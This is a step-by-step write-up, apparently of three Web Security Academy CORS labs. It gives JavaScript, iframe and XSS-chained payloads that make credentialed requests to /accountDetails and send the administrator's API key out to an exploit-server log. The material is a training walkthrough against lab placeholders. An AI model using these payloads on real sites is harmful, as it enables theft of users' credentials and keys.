

**Step1:**

Login to account using wiener and peter


**Step2:**

Now we view /accountDetails request in burpuite.

It is clear that the access-contol-allow-credential is set to true.

Now we inject a basic origin

And in result we can see it is access-control-allow-origin is set to `https://hello.com`

The Access-Control-Allow-Origin response header indicates whether the response can be shared with requesting code from the given origin

**Step3:**

To exploit this there are different approach we use XML request

Exploit
```
<script>

    const labId = 'YOUR-LAB-ID'; // Replace with your unique lab ID

    const url = `https://${labId}.web-security-academy.net/accountDetails`;

    fetch(url, {

        method: 'GET',

        credentials: 'include' // This allows cookies to be sent with the request

    })

    .then(response => response.text())

    .then(data => {

        // Redirect to log page with the key from the response

        location = '/log?key=' + data;

    })

    .catch(error => console.error('Error:', error));

</script>
```


And we can see Administrator API key in logs..click on access log


Copy the API key by first URL decode and submit answer.

**Alternative Payload**
```
<script>

    var labId = 'YOUR-LAB-ID'; // Replace with your unique lab ID

    var req = new XMLHttpRequest();

    req.onload = function() {

        if (this.status === 200) {

            // Redirect to log page with the key from the response

            location = '/log?key=' + this.responseText;

        } else {

            console.error('Request failed with status: ' + this.status);

        }

    };

    req.open('GET', 'https://' + labId + '.web-security-academy.net/accountDetails', true);

    req.withCredentials = true;

    req.send();

</script>
```

Or
```
<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='/log?key='+this.responseText; }; </script>
```


**Step1:**

Login with given credential

**Step2:**

View the /accountDetail request in burpsuite in http history

Now send it to repeater and make this change

Here we see it allow null orgin

**Step3:**

Now we create a sandbox enviroment using iframe that generate null origin for CORS

CORS Vulnerability: In the scenario, the target server accepts requests with a null origin due to improper CORS setup. This allows the JavaScript within the <iframe> to make an XMLHttpRequest to /accountDetails on the lab server, thereby retrieving sensitive information (like the administrator’s API key).

To solve this lab we use payload
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>

    var req = new XMLHttpRequest();

    req.onload = reqListener;

    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);

    req.withCredentials = true;

    req.send();

    function reqListener() {

        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);

    };

</script>"></iframe>
```

Decode the result of access log

And submit api key

Notice the use of an iframe sandbox as this generates a null origin request.

**Step1:**

Login in with given credential

**Step2:**

Now again we open /AccountDetail request in repeater

If we change Origin to anything.Lab-ID it is not give error

**Step3.**

Now we find any vulnerable subdomain on webpage.

In Home->viewDetail->check tock  there is a an XSS vulnerability

**Step4:**

Now we use exploit with this subdomain.

So exploited point:`https://stock.0a56005c03d1c93e812cac8800110021.web-security-academy.net/?productId=1&storeId=1`

Script:
```
<script>

    var req = new XMLHttpRequest();

    req.onload = reqListener;

    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);

    req.withCredentials = true;

    req.send();

    function reqListener() {

        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);

    };

</script>
```
Final exploit
```
<script>  
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"  
</script>
```
Store and deliver it to victim

Results:



Step5:

